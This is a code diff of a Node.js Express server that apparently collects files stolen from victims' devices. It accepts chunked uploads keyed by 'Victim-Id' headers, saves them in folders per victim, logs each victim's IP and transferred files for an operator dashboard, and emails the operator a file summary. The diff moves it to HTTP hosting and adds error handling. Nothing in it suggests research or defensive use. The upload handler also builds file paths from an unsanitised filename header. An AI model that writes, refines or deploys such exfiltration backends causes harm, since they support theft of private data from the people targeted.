@@ -2,17 +2,11 @@ const fs = require('fs');
 require('dotenv').config();
 const cors = require('cors');
 const express = require('express');
-const https = require('https');
 const nodemailer = require('nodemailer');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8443;
-
-const sslOptions = {
-  key: process.env.SSL_KEY,
-  cert: process.env.SSL_CERT,
-};
+const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
 
 // Enable CORS with specific options
 const corsOptions = {
@@ -21,39 +15,28 @@ const corsOptions = {
   allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
   credentials: true,
 };
-
 app.use(cors(corsOptions));
 
 // Log all incoming requests for debugging
 app.use((req, res, next) => {
-  console.log('Request Headers:', req.headers);
-  console.log('Request Method:', req.method);
-  console.log('Request URL:', req.url);
+  console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
   next();
 });
 
 // Handle OPTIONS requests for /upload
 app.options('/upload', (req, res) => {
-  console.log('Handling OPTIONS request for /upload');
-  res.header('Access-Control-Allow-Origin', 'https://deobfrontend-n6m566v6o-2naseernoors-projects.vercel.app');
-  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks');
+  res.header('Access-Control-Allow-Origin', corsOptions.origin);
+  res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
+  res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
   res.header('Access-Control-Allow-Credentials', 'true');
-  res.status(204).end(); // Respond with no content
+  res.status(204).end();
 });
 
 // Serve the dashboard as static files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
 
 // Middleware to handle raw binary data for file uploads
-app.use((req, res, next) => {
-  const contentType = req.headers['content-type'] || '';
-  if (contentType.startsWith('application/octet-stream') && req.url.startsWith('/upload')) {
-    express.raw({ type: 'application/octet-stream', limit: '100mb' })(req, res, next);
-  } else {
-    next();
-  }
-});
+app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));
 
 // Base directory for storing files
 const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
@@ -61,11 +44,12 @@ if (!fs.existsSync(OUTPUT_BASE_DIR)) {
   fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
 }
 
+// Email Setup (Check if environment variables are available)
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS,
+    user: process.env.EMAIL_USER || '',
+    pass: process.env.EMAIL_PASS || '',
   },
 });
 
@@ -77,16 +61,24 @@ const connectedDevices = {};
 
 // Function to send email
 async function sendEmail(victimId, files) {
+  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
+    console.error('❌ Email not sent: Missing EMAIL_USER or EMAIL_PASS');
+    return;
+  }
+
   console.log(`🔍 Preparing to send email for victim ${victimId}...`);
 
-  const fileRows = files.map((file, index) =>
-    `<tr>
-      <td>${index + 1}</td>
-      <td>${file.name}</td>
-      <td>${file.type}</td>
-      <td>${file.size} bytes</td>
-    </tr>`
-  ).join('');
+  const fileRows = files
+    .map(
+      (file, index) => `
+      <tr>
+        <td>${index + 1}</td>
+        <td>${file.name}</td>
+        <td>${file.type}</td>
+        <td>${file.size} bytes</td>
+      </tr>`
+    )
+    .join('');
 
   const htmlContent = `
     <h2>Files Received from Victim ${victimId}</h2>
@@ -135,47 +127,56 @@ async function checkAndSendEmail(victimId, victimFolder) {
 
 // Route to handle file uploads
 app.post('/upload', (req, res) => {
-  let filename = decodeURIComponent(req.headers['filename']);
-  let victimId = decodeURIComponent(req.headers['victim-id']);
-  let ip = req.ip;
+  try {
+    const filename = decodeURIComponent(req.headers['filename']);
+    const victimId = decodeURIComponent(req.headers['victim-id']);
+    const ip = req.ip;
 
-  if (!connectedDevices[victimId]) {
-    connectedDevices[victimId] = {
-      ip: ip,
-      connectionTime: new Date(),
-      lastConnectionTime: new Date(),
-      filesTransferred: 0,
-      fileList: []
-    };
-  } else {
-    connectedDevices[victimId].lastConnectionTime = new Date();
-  }
-
-  if (!victimFolders[victimId]) {
-    const timestamp = new Date().toISOString().replace(/:/g, '-');
-    victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
-    fs.mkdirSync(victimFolders[victimId], { recursive: true });
-    victimFileCounts[victimId] = 0;
-    victimTotalFiles[victimId] = parseInt(req.headers['total-files'], 10);
-  }
-
-  const victimFolder = victimFolders[victimId];
-  const filePath = path.join(victimFolder, filename);
-
-  fs.appendFile(filePath, req.body, (err) => {
-    if (err) {
-      console.error(`❌ Error writing file:`, err);
-      return res.status(500).send('Error saving file');
+    if (!filename || !victimId) {
+      return res.status(400).json({ error: 'Missing Filename or Victim-Id' });
     }
 
-    console.log(`✅ File received: ${filename}`);
-    victimFileCounts[victimId] += 1;
-    connectedDevices[victimId].filesTransferred += 1;
-    connectedDevices[victimId].fileList.push(filename);
+    if (!connectedDevices[victimId]) {
+      connectedDevices[victimId] = {
+        ip: ip,
+        connectionTime: new Date(),
+        lastConnectionTime: new Date(),
+        filesTransferred: 0,
+        fileList: [],
+      };
+    } else {
+      connectedDevices[victimId].lastConnectionTime = new Date();
+    }
 
-    checkAndSendEmail(victimId, victimFolder);
-    res.status(200).send('OK');
-  });
+    if (!victimFolders[victimId]) {
+      const timestamp = new Date().toISOString().replace(/:/g, '-');
+      victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
+      fs.mkdirSync(victimFolders[victimId], { recursive: true });
+      victimFileCounts[victimId] = 0;
+      victimTotalFiles[victimId] = parseInt(req.headers['total-files'], 10);
+    }
+
+    const victimFolder = victimFolders[victimId];
+    const filePath = path.join(victimFolder, filename);
+
+    fs.appendFile(filePath, req.body, (err) => {
+      if (err) {
+        console.error(`❌ Error writing file:`, err);
+        return res.status(500).json({ error: 'Error saving file' });
+      }
+
+      console.log(`✅ File received: ${filename}`);
+      victimFileCounts[victimId] += 1;
+      connectedDevices[victimId].filesTransferred += 1;
+      connectedDevices[victimId].fileList.push(filename);
+
+      checkAndSendEmail(victimId, victimFolder);
+      res.status(200).json({ message: 'File received successfully' });
+    });
+  } catch (error) {
+    console.error(`❌ Error handling upload:`, error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
 });
 
 // Route to provide dashboard data
@@ -184,6 +185,6 @@ app.get('/dashboard-data', (req, res) => {
 });
 
 // Start the server
-https.createServer(sslOptions, app).listen(PORT, () => {
-  console.log(`🔐 HTTPS server is running on https://localhost:${PORT}`);
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
 });
